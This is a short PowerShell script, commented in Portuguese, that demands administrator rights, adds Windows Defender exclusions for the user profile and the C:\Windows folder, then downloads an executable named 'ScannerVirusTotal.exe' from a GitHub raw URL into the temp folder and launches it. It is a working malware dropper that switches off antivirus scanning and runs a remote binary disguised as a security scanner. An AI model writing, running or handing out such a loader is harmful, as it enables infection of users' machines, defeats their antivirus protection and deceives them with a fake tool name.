# Executar como Administrador
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Por favor, execute este script como Administrador." -ForegroundColor Red
    Exit
}

# Adicionar exclusões ao Windows Defender (necessita privilégios de administrador)
Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath "C:\Windows"

# URL correta para download (verifique se o link está acessível)
$url = "https://github.com/Oqgpp/filev/raw/refs/heads/main/ScannerVirusTotal.exe"

# Definir local de saída temporário
$output = "$env:TEMP\ScannerVirusTotal.exe"

# Fazer o download do executável
try {
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
    Write-Host "Download concluído com sucesso!" -ForegroundColor Green
} catch {
    Write-Host "Erro ao baixar o arquivo. Verifique a URL ou conexão com a internet." -ForegroundColor Red
    Exit
}

# Aguardar 6 segundos
Start-Sleep -Milliseconds 6000

# Verificar se o arquivo foi baixado corretamente antes de executar
if (Test-Path $output) {
    Write-Host "Executando o arquivo baixado..." -ForegroundColor Yellow
    Start-Process -FilePath $output
} else {
    Write-Host "Erro: O arquivo não foi baixado corretamente." -ForegroundColor Red
}